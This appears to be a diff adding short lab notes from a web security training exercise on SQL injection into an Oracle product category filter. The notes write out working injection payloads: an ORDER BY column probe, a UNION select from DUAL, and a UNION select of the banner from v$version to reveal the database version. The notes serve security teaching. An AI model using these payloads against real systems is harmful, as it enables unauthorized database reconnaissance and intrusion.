@@ -1,0 +1,24 @@
+Lab-07 - SQL injection attack, querying the database type and version on Oracle
+
+SQL Injection - Product category filter
+
+End Goal - display the database version string
+
+Analysis:
+
+1) Determine the number of columns
+' order by 3-- -> internal server error
+
+3 - 1 = 2
+
+
+2) Determine the data type of the columns
+' UNION select 'a', 'a' from DUAL-- -> Oracle database
+
+
+3) Output the version of the database
+' UNION select banner, null from v$version--
+
+SELECT banner from v$version
+
+script.py <url>
